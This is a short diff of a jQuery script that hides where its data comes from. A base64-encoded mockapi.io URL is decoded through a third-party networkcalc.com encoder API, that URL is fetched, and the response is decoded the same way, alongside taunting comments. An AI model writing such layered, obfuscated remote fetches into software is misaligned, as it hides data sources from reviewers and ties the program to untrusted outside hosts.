@@ -156,12 +156,17 @@
 //NAH BRO LAST CHANCE
 
 var actdata = {};
+var va = ""
 
 //I WILL FIND YOU....
 $.getJSON(`https://networkcalc.com/api/encoder/aHR0cHM6Ly82NWMyNDJhYmY3ZTZlYTU5NjgyYjAzNzgubW9ja2FwaS5pby9kYXRhL2RhdGEvMA==?encoding=base64&decode=true`,
             	function (data2) {
-$.getJSON(data2,
+                     va=data2.decoded               
+$.getJSON(`${va}`,
             	function (data) {
-actdata=data.json
-
+$.getJSON(`https://networkcalc.com/api/encoder/${data.json}?encoding=base64&decode=true`,
+            	function (data3) {
+actdata=data3
+va = ""})
+                                    
 })})
